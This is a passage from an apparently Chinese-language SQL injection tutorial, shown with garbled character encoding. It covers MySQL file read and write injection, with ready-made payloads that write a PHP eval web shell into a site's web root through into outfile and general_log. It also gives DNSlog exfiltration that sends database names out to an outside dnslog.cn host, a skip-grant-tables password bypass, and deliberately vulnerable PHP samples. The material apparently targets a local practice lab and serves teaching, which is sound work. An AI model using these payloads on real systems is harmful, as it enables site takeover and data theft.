</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> è¡¨å <span style="color:#c678dd">READ</span> å­—æ®µå <span style="color:#c678dd">KEY</span> (å­—æ®µå€¼);
</span></span></code></pre></div><h4 id="å…³é—­å¥æŸ„">å…³é—­å¥æŸ„
</h4><div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">handler</span> è¡¨å <span style="color:#c678dd">close</span>;
</span></span></code></pre></div><h2 id="5-æ–‡ä»¶è¯»å†™æ³¨å…¥">#5 æ–‡ä»¶è¯»å†™æ³¨å…¥
</h2><h3 id="å‰æ">å‰æ
</h3><p><strong>mysqlæ•°æ®åº“ä¸­çš„<code>secure_file_priv</code>å‚æ•°æŒ‡å®šäº†æ•°æ®åº“å¯¼å…¥å’Œå¯¼å‡ºçš„å®‰å…¨è·¯å¾„</strong></p>
<p>è¯¥å‚æ•°å¯ä»¥æœ‰ä¸‰ç§ç±»å‹ï¼š</p>
<ul>
<li>
<p><strong><code>secure_file_priv=NULL</code></strong>ï¼šç¦æ­¢å¯¼å…¥å’Œå¯¼å‡º</p>
</li>
<li>
<p><strong><code>secure_file_priv=/</code></strong>ï¼šåªèƒ½åœ¨/ç›®å½•ä¸‹å¯¼å…¥å’Œå¯¼å‡º</p>
</li>
<li>
<p><strong><code>secure_file_priv=&quot;&quot;</code></strong> ï¼šä¸åšé™åˆ¶</p>
</li>
</ul>
<p><strong>æ‰“å¼€<code>mysql.ini</code>æ–‡ä»¶ï¼Œåœ¨[mysqld]ä¸‹ä¿®æ”¹ï¼ˆå¦‚æœæ‰¾ä¸åˆ°å°±æ·»åŠ è¿›å»ï¼Œä¸€èˆ¬éƒ½æœ‰ï¼‰å¦‚ä¸‹ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e06c75">secure_file_priv</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;&#34;</span>
</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707200427206.png" alt="image-20250707200427206" style="zoom:50%;" />
<p><strong>é‡å¯æœåŠ¡ï¼Œåœ¨å‘½ä»¤è¡Œç™»å½•mysqlæ•°æ®åº“ï¼ˆæ‰¾<code>mysql.exe</code>,æˆ‘çš„è·¯å¾„æ˜¯<code>phpStudy\PHPTutorial\MySQL\bin</code>ï¼‰ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>mysql -u root -p
</span></span></code></pre></div><p><strong>å¦‚æœä¸çŸ¥é“å¯†ç ï¼Œå°±åœ¨<code>mysql.ini</code>ä¸­æ·»åŠ <code>skip-grant-tables</code>ï¼Œè·Ÿä¸Šé¢å‘½ä»¤æ”¾åœ¨ä¸€èµ·å°±è¡Œï¼Œæ„æ€æ˜¯ä¸éœ€è¦ç™»å½•å¯†ç </strong></p>
<p>ç™»å½•åæœç´¢è¯¥å‚æ•°ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">show</span> <span style="color:#e06c75">variables</span> <span style="color:#c678dd">like</span> <span style="color:#98c379">&#39;%priv%&#39;</span>
</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707201002609.png" alt="image-20250707201002609" style="zoom: 80%;" />
<p><strong>æ˜¾ç¤º<code>secure_file_priv</code>å¯¹åº”valueå€¼ä¸ºç©ºï¼Œè¯´æ˜ä¸åšé™åˆ¶äº†</strong></p>
<h3 id="æ–‡ä»¶è¯»å–">æ–‡ä»¶è¯»å–
</h3><p><strong>åˆ©ç”¨<code>load_file</code>å‡½æ•°èƒ½åšåˆ°å¯¹æœåŠ¡å™¨æ–‡ä»¶çš„è¯»å–ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">load_file</span>(<span style="color:#98c379">&#34;D:\\1.txt&#34;</span>);
</span></span></code></pre></div><p>é…åˆæ³¨å…¥è¯­å¥ï¼Œæˆ‘ä»¬å¯ä»¥åšåˆ°è¯»å–ä»»æ„æ–‡ä»¶ï¼ˆå½“ç„¶å‰ææ˜¯é¡µé¢ä¼šæœ‰è¾“å‡ºï¼‰ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,load_file(&#39;D:/WWW/1.txt&#39;) #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250707205449502" href="http://picture.928330.xyz/typora/image-20250707205449502.png">
<img src="http://picture.928330.xyz/typora/image-20250707205449502.png" alt="image-20250707205449502"  />
</a>
</div>
</p>
<blockquote>
<p>æ³¨æ„ï¼š</p>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>/</code>ï¼Œå› ä¸º<code>\</code>æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œè€Œ<code>/</code>åœ¨å­—ç¬¦ä¸²é‡Œé¢æ²¡æœ‰ä»»ä½•å«ä¹‰</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>\\</code>ï¼Œç»™<code>\</code>è½¬ä¹‰ï¼Œè®©å®ƒè¢«å½“åšæ™®é€šå­—ç¬¦å¤„ç†</p>
</blockquote>
<h3 id="æ™®é€šæ–‡ä»¶å†™å…¥">æ™®é€šæ–‡ä»¶å†™å…¥
</h3><p><strong>åˆ©ç”¨<code>into outfile</code>å¯ä»¥å®ç°ä»»æ„å†…å®¹å†™å…¥æŒ‡å®šä½ç½®çš„æ–‡ä»¶ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#34;&lt;? evilcode ?&gt;&#34;</span> <span style="color:#c678dd">into</span> <span style="color:#e06c75">outfile</span> <span style="color:#98c379">&#34;D:\\1.txt&#34;</span>;
</span></span></code></pre></div><p><strong>ä¹Ÿå¯ä»¥ä½¿ç”¨<code>into dumpfile</code>ï¼ŒåŒºåˆ«æ˜¯å®ƒåªç”Ÿæˆä¸€è¡Œæ•°æ®ï¼Œä¸ä¼šå¯¹æ•°æ®åšä»»ä½•å¤„ç†ï¼ˆæ¢è¡Œç­‰ï¼‰ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#34;&lt;? evilcode ?&gt;&#34;</span> <span style="color:#c678dd">into</span> <span style="color:#e06c75">dumpfile</span> <span style="color:#98c379">&#34;D:\\1.txt&#34;</span>;
</span></span></code></pre></div><p><strong>åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</strong></p>
<h4 id="union-select">union select
</h4><p>æœ€å¸¸ç”¨çš„å†™å…¥æ–¹å¼ï¼Œåœ¨selectå†…å®¹ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; into outfile &#39;D:/WWW/114514.php&#39; #
</span></span></code></pre></div><img src="http://picture.928330.xyz/typora/image-20250707205900643.png" alt="image-20250707205900643"  />
<p>è™½ç„¶æŠ¥é”™ï¼Œä½†æ˜¯æ–‡ä»¶ä¹Ÿå†™å…¥æˆåŠŸäº†ï¼š</p>
<img src="http://picture.928330.xyz/typora/image-20250707205828237.png" alt="image-20250707205828237"  />
<p><strong>æ¥ç€å°±å¯ä»¥ä½¿ç”¨èšå‰‘ç­‰å·¥å…·æ¥ç®¡ç½‘ç«™</strong></p>
<h4 id="lines-terminated-by">lines terminated by
</h4><p><strong><code>lines terminated by</code>ç”¨æ¥å®šä¹‰å¯¼å‡ºçš„æ–‡ä»¶ä¸­æ¯è¡Œæ•°æ®ä»¥ä»€ä¹ˆå­—ç¬¦ç»“å°¾ï¼ˆé»˜è®¤æ˜¯æ¢è¡Œç¬¦ <code>\n</code>ï¼‰ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250708141833937" href="http://picture.928330.xyz/typora/image-20250708141833937.png">
<img src="http://picture.928330.xyz/typora/image-20250708141833937.png" alt="image-20250708141833937"  />
</a>
</div>
</p>
<h4 id="lins-starting-by">lins starting by
</h4><p><strong>ä¸ä¸Šä¸€ç§ç›¸åï¼Œå®ƒæ§åˆ¶çš„æ˜¯æ¯ä¸€è¡Œå¼€å§‹ä½ç½®çš„å†…å®¹ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; lines starting by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250708141731385" href="http://picture.928330.xyz/typora/image-20250708141731385.png">
<img src="http://picture.928330.xyz/typora/image-20250708141731385.png" alt="image-20250708141731385"  />
</a>
</div>
</p>
<h4 id="fields-terminated-by">fields terminated by
</h4><p><strong><code>fields terminated by</code>æ§åˆ¶çš„æ˜¯ä¸€è¡Œæ•°æ®ä¸­ï¼Œå„ä¸ªå­—æ®µï¼ˆåˆ—ï¼‰ä¹‹é—´çš„åˆ†éš”ç¬¦ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; fields terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250708142123580" href="http://picture.928330.xyz/typora/image-20250708142123580.png">
<img src="http://picture.928330.xyz/typora/image-20250708142123580.png" alt="image-20250708142123580"  />
</a>
</div>
</p>
<h4 id="columns-terminated-by">columns terminated by
</h4><p><strong>æ˜¯ä¸Šä¸€ç§çš„åŒä¹‰è¯ï¼Œä½œç”¨å®Œå…¨ä¸€æ ·ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; into outfile &#39;D:/WWW/114514.php&#39; columns terminated by &#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39; #
</span></span></code></pre></div><h3 id="æ—¥å¿—æ–‡ä»¶å†™å…¥">æ—¥å¿—æ–‡ä»¶å†™å…¥
</h3><p>å¦‚æœmysqlæ— æ³•æ›´æ”¹å¯¼å‡ºæ–‡ä»¶è·¯å¾„ï¼Œæˆ–è€…æ ¹æœ¬ä¸å…è®¸å¯¼å‡ºè·¯å¾„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æ—¥å¿—æ–‡ä»¶æ³¨å…¥</p>
<p><strong>å†™å…¥çš„å‰ææ˜¯è¦å¼€å¯<code>general log</code>æˆ–è€…<code>slow_query_log</code>æ¨¡å¼ï¼Œå¹¶è®¾ç½®ç›®å½•åœ°å€</strong></p>
<p><strong>ä¸‹é¢ç”¨<code>general log</code>åšæ¼”ç¤º</strong></p>
<p><strong>æŸ¥çœ‹é…ç½®ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>show variables like &#39;%general%&#39;
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250708165305034" href="http://picture.928330.xyz/typora/image-20250708165305034.png">
<img src="http://picture.928330.xyz/typora/image-20250708165305034.png" alt="image-20250708165305034"  />
</a>
</div>
</p>
<p><strong>å¼€å¯<code>general log</code>æ¨¡å¼ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>set global general_log = on;   
</span></span></code></pre></div><p><strong>è®¾ç½®ç›®å½•åœ°å€ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>set global general_log_file = &#39;D:/WWW/114514.php&#39;;
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250708165642906" href="http://picture.928330.xyz/typora/image-20250708165642906.png">
<img src="http://picture.928330.xyz/typora/image-20250708165642906.png" alt="image-20250708165642906"  />
</a>
</div>
</p>
<p><strong>æ¥ä¸‹æ¥å°±å¯ä»¥å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#98c379">&#39;&lt;?php eval($_POST[kaka]); ?&gt;&#39;</span> 
</span></span></code></pre></div><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20250708170501479.png" alt="image-20250708170501479" style="zoom:67%;" />
<p><strong>æˆ‘ä»¬è¾“å…¥çš„æœ¨é©¬ä¼šè¢«è®¾å®šçš„logæ–‡ä»¶è®°å½•ï¼Œè¿™æ—¶å€™å°±èƒ½ç”¨èšå‰‘è¿æ¥ç½‘ç«™</strong></p>
<h2 id="6-dnslogæ³¨å…¥">#6 DNSlogæ³¨å…¥
</h2><p><strong>DNSåœ¨è¿›è¡ŒåŸŸåè§£ææ—¶ä¼šç•™ä¸‹åŸŸåå’Œè§£æipçš„è®°å½•(DNSlog)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ˜¾ç¤ºæˆ‘ä»¬çš„æ³¨å…¥ç»“æœ</strong></p>
<p>1.å°†æƒ³è¦çªƒå–çš„æ•°æ®ï¼ˆå¦‚æ•°æ®åº“åã€ç”¨æˆ·åç­‰ï¼‰ä½œä¸ºè¿™ä¸ªåŸŸåçš„å­åŸŸåæ‹¼æ¥åˆ°æŸ¥è¯¢ä¸­</p>
<p>2.è¿«ä½¿æ•°æ®åº“æœåŠ¡å™¨å‘ä¸€ä¸ªç”±æˆ‘ä»¬æ§åˆ¶çš„åŸŸåå‘èµ·DNSæŸ¥è¯¢è¯·æ±‚</p>
<p><strong>DNSLOGæ³¨å…¥éœ€è¦æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼š</strong></p>
<ul>
<li><strong>ç›®æ ‡æ•°æ®åº“æœåŠ¡å™¨èƒ½å¤Ÿå‘å¤–ç½‘å‘èµ·DNSè¯·æ±‚</strong></li>
<li><strong>å¼€å¯äº†<code>load_file()</code>è¯»å–æ–‡ä»¶çš„å‡½æ•°</strong></li>
</ul>
<h3 id="å‡†å¤‡dnslogå¹³å°">å‡†å¤‡DNSlogå¹³å°
</h3><p>ç½‘ç»œä¸Šæœ‰å¾ˆå¤šå…¬å¼€DNSlogçš„æœåŠ¡ï¼Œå¦‚www.dnslog.cnï¼Œæˆ–ä½¿ç”¨BurpSuiteè‡ªå¸¦çš„BurpCollaborator</p>
<p>ä»¥dnslog.cnä¸ºä¾‹ï¼Œ<strong>ç‚¹å‡»<code>Get SubDomain</code>åï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„å­åŸŸå</strong>ï¼Œä¾‹å¦‚ï¼š<code>624elh.dnslog.cn</code>ï¼š

<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250701173327303" href="http://picture.928330.xyz/typora/image-20250701173327303.png">
<img src="http://picture.928330.xyz/typora/image-20250701173327303.png" alt="image-20250701173327303"  />
</a>
</div>
</p>
<h3 id="æ„é€ æ³¨å…¥payload">æ„é€ æ³¨å…¥Payload
</h3><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨æ•°æ®åº“ä¸­èƒ½å¤Ÿè§¦å‘ç½‘ç»œè¯·æ±‚çš„å‡½æ•°ï¼Œåœ¨MySQLä¸­ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ä¸Šæ–‡æåˆ°è¿‡çš„<code>load_file()</code>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.624elh.dnslog.cn\\a&#39;))#
</span></span></code></pre></div><p>å½“æ•°æ®åº“æ‰§è¡Œè¿™ä¸ªPayloadæ—¶ï¼Œå®ƒä¼šå°è¯•ä½¿ç”¨<code>load_file()</code>å»è¯»å–ä¸€ä¸ªç½‘ç»œè·¯å¾„</p>
<p><code>concat()</code>å‡½æ•°ä¼šå°†å„éƒ¨åˆ†æ‹¼æ¥èµ·æ¥ï¼Œæ„é€ å‡ºä¸€ä¸ªå®Œæ•´çš„UNCè·¯å¾„ï¼š<code>\\dvwa.624elh.dnslog.cn\a</code></p>
<p><strong>ä¸ºäº†è®¿é—®è¿™ä¸ªç½‘ç»œè·¯å¾„ï¼ŒæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿå¿…é¡»å…ˆè§£æä¸»æœºå <code>dvwa.624elh.dnslog.cn</code>ï¼Œå› æ­¤å®ƒä¼šå‘DNSæœåŠ¡å™¨å‘èµ·ä¸€ä¸ªDNSæŸ¥è¯¢è¯·æ±‚</strong></p>
<p><strong>å›åˆ°DNSlogï¼Œç‚¹å‡»<code>Refresh Record</code>ï¼Œå°†ä¼šæ˜¾ç¤ºå‡ºdnsè§£æè®°å½•</strong></p>
<p>è¿™æ ·ï¼Œæ•°æ®åº“å<code>'dvwa'</code>å°±ä½œä¸ºå­åŸŸåçš„ä¸€éƒ¨åˆ†ï¼Œè¢«æˆåŠŸåœ°å¸¦åˆ°äº†å¤–éƒ¨ï¼Œå®ç°äº†æ•°æ®æ³„éœ²ï¼š</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250701173610414" href="http://picture.928330.xyz/typora/image-20250701173610414.png">
<img src="http://picture.928330.xyz/typora/image-20250701173610414.png" alt="image-20250701173610414"  />
</a>
</div>
</p>
<h2 id="7-httpè¯·æ±‚æ³¨å…¥">#7 httpè¯·æ±‚æ³¨å…¥
</h2><h3 id="getpostè¯·æ±‚æ³¨å…¥">GET/POSTè¯·æ±‚æ³¨å…¥
</h3><p>å®Œæ•´çœ‹åˆ°è¿™é‡Œçš„ä½ ï¼Œå°±ä¼šå‘ç°ä¸Šé¢æˆ‘ä»¬è®¨è®ºçš„æ³¨å…¥ç»å¤§å¤šæ•°éƒ½æ˜¯åœ¨GETå’ŒPOSTçš„åœºæ™¯ä¸‹</p>
<p>æˆ‘ä»¬ç®€å•å¥ä¸¤ä¸ªä¾‹å­è¯´æ˜</p>
<p>==<strong>GETè¯·æ±‚ï¼ˆæŸ¥è¯¢ç­‰ï¼‰ï¼š</strong>==</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$id</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_GET</span>[<span style="color:#98c379">&#39;id&#39;</span>]; 
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE user_id = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$id</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql</span>);
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>æˆ‘ä»¬ä¸€èˆ¬æ˜¯åœ¨æŸ¥è¯¢è¾“å…¥æ¡†ä¸­è¾“å…¥æ³¨å…¥è¯­å¥ï¼Œå…¶å®ä¹Ÿå¯ä»¥åœ¨urlä¸­ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>http://example.com/get_vuln.php?id=1&#39; UNION SELECT 1, user, password FROM users#
</span></span></code></pre></div><p>idåé¢å…¶å®å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥çš„å†…å®¹</p>
<p><strong>==POSTè¯·æ±‚ï¼ˆç™»å½•ç­‰ï¼‰ï¼š==</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$username</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$password</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_POST</span>[<span style="color:#98c379">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$sql</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM users WHERE username = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$username</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39; AND password = &#39;&#34;</span> <span style="color:#56b6c2">.</span> <span style="color:#e06c75">$password</span> <span style="color:#56b6c2">.</span> <span style="color:#98c379">&#34;&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>å…¶å®ä¹Ÿå°±æ˜¯åœ¨è¾“å…¥æ¡†é‡Œå¡«å†™æ³¨å…¥è¯­å¥å°±è¡Œï¼Œä¹Ÿå¯ä»¥æŠ“åŒ…åä¿®æ”¹</p>
<h3 id="httpå¤´éƒ¨å‚æ•°æ³¨å…¥">httpå¤´éƒ¨å‚æ•°æ³¨å…¥
</h3><p>httpå¤´éƒ¨æœ‰ç€è®¸å¤šå‚æ•°ï¼Œå¼€å‘è€…å¯èƒ½å› ä¸ºè®°å½•æ—¥å¿—ã€åˆ†æç”¨æˆ·è¡Œä¸ºç­‰ç›®çš„ï¼Œä»è¿™äº›å‚æ•°ä¸­è·å–ä¿¡æ¯å¹¶å­˜å…¥æ•°æ®åº“ï¼Œä½†è¿‡ç¨‹ä¸­æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´äº†æ³¨å…¥</p>
<p>è¿™é‡Œä»¥æœ€å¸¸è§çš„<code>User-Agent</code>ã€<code>Referer</code>ã€<code>X-Forwarded-For</code>ä¸‰ä¸ªå­—æ®µä¸¾ä¾‹ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#56b6c2">&lt;?</span><span style="color:#e06c75">php</span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$ip</span>         <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_X_FORWARDED_FOR&#39;</span>]; <span style="color:#7f848e">// è·å–ä¼ªé€ çš„å®¢æˆ·ç«¯IP
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$user_agent</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_USER_AGENT&#39;</span>];    <span style="color:#7f848e">// è·å–æµè§ˆå™¨æ ‡è¯†
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$referer</span>    <span style="color:#56b6c2">=</span> <span style="color:#e06c75">$_SERVER</span>[<span style="color:#98c379">&#39;HTTP_REFERER&#39;</span>];       <span style="color:#7f848e">// è·å–æ¥æºé¡µé¢
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">// æ¼æ´ç‚¹ä¸€ï¼šæ ¹æ®IPæŸ¥è¯¢è¯¥ç”¨æˆ·æ˜¯å¦åœ¨é»‘åå•ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_ip</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM ip_blacklist WHERE ip = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$ip</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_ip</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_ip</span>);
</span></span><span style="display:flex;"><span><span style="color:#7f848e">// æ¼æ´ç‚¹äºŒï¼šæ ¹æ®æµè§ˆå™¨æ ‡è¯†ï¼Œæä¾›å®šåˆ¶åŒ–å†…å®¹
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_ua</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM custom_content WHERE user_agent_key = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$user_agent</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_ua</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_ua</span>);
</span></span><span style="display:flex;"><span><span style="color:#7f848e">// æ¼æ´ç‚¹ä¸‰ï¼šè®°å½•è®¿é—®æ¥æº
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span><span style="color:#e06c75">$sql_referer</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;SELECT * FROM referer_stats WHERE page_url = &#39;</span><span style="color:#98c379">{</span><span style="color:#e06c75">$referer</span><span style="color:#98c379">}</span><span style="color:#98c379">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">$result_referer</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">mysqli_query</span>(<span style="color:#e06c75">$conn</span>, <span style="color:#e06c75">$sql_referer</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">echo</span> <span style="color:#98c379">&#34;è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#7f848e">?&gt;</span>
</span></span></code></pre></div><p>è¿™é‡Œä¸‰ä¸ªå­—æ®µéƒ½æ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬æŠ“åŒ…ä¹‹åä¿®æ”¹å¯¹åº”å†…å®¹ï¼š</p>
